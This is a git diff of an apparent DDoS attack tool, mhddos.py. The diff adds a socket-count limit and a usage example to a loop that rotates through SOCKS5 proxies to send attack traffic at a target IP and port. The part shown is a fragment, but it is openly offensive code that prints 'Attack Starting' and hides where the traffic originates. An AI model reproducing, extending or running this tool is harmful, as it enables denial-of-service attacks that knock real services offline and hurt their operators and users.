@@ -21,7 +21,8 @@ print('''
 \033[91m +--------------------------------------------+''')
 print_slow('\033[94m      Coded By MH_ProDev, Anti-Hack')
 print('''\033[91m +--------------------------------------------+\033[97m''')
-print('usge: mhddos.py [ip] [port] [proxylist]')
+print('usge: ./mhddos.py [ip] [port] [proxylist] [socket]')
+print('./mhddos.py 127.0.0.1 80 proxy.txt 8000')
 
 time = 3
 print(f"\033[94mAttack Starting On {time}s")
@@ -45,8 +46,14 @@ with open(proxylist, "r") as f:
 def main():
     global randoms
     global port
+    global sockets
+    sockets = 0
     while True:
         try:
+            if sockets == int(sys.argv[4]):
+                print("Attack Stopped")
+                exit()
+            sockets = sockets + 1
             proxy = random.choice(lines)
             socks.set_default_proxy(socks.SOCKS5, str(proxy.rstrip("\n\r")))
             if randoms != 65535:
